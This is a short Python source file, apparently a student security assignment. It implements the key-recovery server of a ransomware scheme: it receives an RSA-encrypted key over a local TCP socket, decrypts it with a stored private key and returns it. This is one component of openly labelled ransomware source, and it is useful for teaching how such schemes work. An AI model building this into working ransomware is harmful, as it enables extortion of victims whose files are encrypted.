# File          : ransomewareServer.txt 
# Assignment    : ACS-A1
# Programmer    : Addison Phillips
# Description   : This server is used to accept a connection from a client and 
#                 decrypt the keyt hat is given to it. It then sends that key
#                 back.                 

import socketserver
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding


class ClientHandler(socketserver.BaseRequestHandler):
    def handle(self):
        encrypted_key = self.request.recv(1024).strip()
        # print("Implement decryption of data " + encrypted_key)
        
        # load the private key first
        # Then read the contents and store it in private_key
        with open(".\Keys\pub_priv_pair.key", "rb") as private_key_file:
            private_key = serialization.load_pem_private_key(
                private_key_file.read(),
                password=None
            )
            # This is where we decrypt the key given using the private key
        decrypted_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        # This is where we send the key back
        self.request.sendall(decrypted_key)

    # this is where the conection is established with the client. It excutes 
    # the above code once the client connects. 


if __name__ == "__main__":
    HOST, PORT = "127.0.0.1", 8000
    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
    try:
        tcpServer.serve_forever()  
    except:
        print("There was an error")